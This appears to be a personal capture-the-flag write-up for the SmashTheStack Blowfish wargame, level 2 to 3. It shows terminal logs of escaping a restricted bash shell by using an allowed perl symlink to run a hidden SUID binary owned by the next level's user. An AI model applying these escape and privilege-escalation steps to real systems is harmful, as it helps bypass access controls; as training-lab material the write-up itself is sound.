# Blowfish Level 02 → 03 (Bypassed)

## Previous Flag
```
N/A
```

## Goal
Note: Think something wrong w/ level 2 → 3

## What I learned
```
rbash
```

## Side Quest
```
# What it was suppose to look like in restricted shell
level3@blowfish:~$ find / -user level4 -group level3 2>/dev/null
-rbash: /dev/null: restricted: cannot redirect output
level3@blowfish:~$ find / -user level4 -group level3
-rbash: find: command not found
level3@blowfish:~$ pwd
/home/level3
level3@blowfish:~$ ls
-rbash: ls: command not found
level3@blowfish:~$ /usr/ls
-rbash: /usr/ls: restricted: cannot specify `/’ in command names
level3@blowfish:~$ pwd
/home/level3
level3@blowfish:~$ echo $PATH
/home/rbash
level2@blowfish:~$ find / -user level4 -group level3 2>/dev/null
/home/level3/..     /cat_lvl4
level2@blowfish:~$ ls -la “/home/level3/..     /cat_lvl4”
-r-sr-x— 1 level4 level3 7460 2007-12-03 13:41 /home/level3/..     /cat_lvl4 👀 want to execute this SUID program
level2@blowfish:~$ ls -la /home/rbash
total 8
drwxr-xr-x 2 711 root 4096 2009-08-15 22:11 .
drwxr-xr-x 22 l3thal root 4096 2009-08-09 23:35 ..
lrwxrwxrwx 1 711 root 8 2009-08-15 22:11 cat -> /bin/cat
lrwxrwxrwx 1 711 root 13 2009-08-09 23:13 perl -> /usr/bin/perl

level2@blowfish:/tmp/.somedir$ cat test.pl
#!/usr/bin/perl
system(‘/home/level3/..\ \ \ \ \ /cat_lvl4’);
level2@blowfish:/tmp/.somedir$ chmod 777 test.pl
level2@blowfish:/tmp/.somedir$ ls -la test.pl
-rwxrwxrwx 1 level2 level2 62 2012-07-20 09:05 test.pl

level3@blowfish:~$ perl /tmp/.somedir/test.pl
```

## Solution
```
PS C:\Users\trung.DESKTOP-G7C81CH\Downloads\01noobHacker> ssh -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedAlgorithms=+ssh-rsa -l level3 blowfish.smashthestack.org -p 2222 ⌨️❤️
level2@blowfish.smashthestack.org's password: ⌨️ N/A
```

## Flag
N/A

## Continue
[Continue](./Blowfish0204.md)